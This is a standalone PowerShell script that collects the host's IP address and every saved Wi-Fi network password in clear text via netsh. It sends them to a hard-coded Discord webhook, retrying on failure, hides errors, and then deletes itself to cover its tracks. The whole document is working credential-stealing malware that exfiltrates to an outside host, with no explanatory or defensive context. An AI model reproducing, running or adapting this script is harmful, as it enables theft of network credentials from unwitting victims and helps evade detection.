$webhook = 'https://discord.com/api/webhooks/1366448699399737384/9t26EIV2kKQCNtTNoADSPuBKMr9PCR21loACGl-2bkUVOVUpKvNGdJTS_4jE2lFnLSCb'

function Send-Data {
    param([string]$content)
    $tries = 0
    $maxTries = 5
    while ($tries -lt $maxTries) {
        try {
            Invoke-RestMethod -Uri $webhook -Method POST -Body (@{content=$content} | ConvertTo-Json -Depth 3) -ContentType 'application/json'
            break
        } catch {
            $tries++
            Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
        }
    }
}

try {
    $IP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"} | Select-Object -First 1 -ExpandProperty IPAddress)
    $MESSAGE = "Coming from: $IP`n`n--------------------`n`n"
    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
    foreach ($profile in $profiles) {
        $key = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ':')[1].Trim() })
        if (-not $key) { $key = "None" }
        $MESSAGE += "Network: $profile`nNetwork Password: $key`n`n--------------------`n`n"
    }
    Send-Data -content $MESSAGE
} catch {}

$myPath = $MyInvocation.MyCommand.Definition
Start-Sleep -Seconds 2
Remove-Item $myPath -Force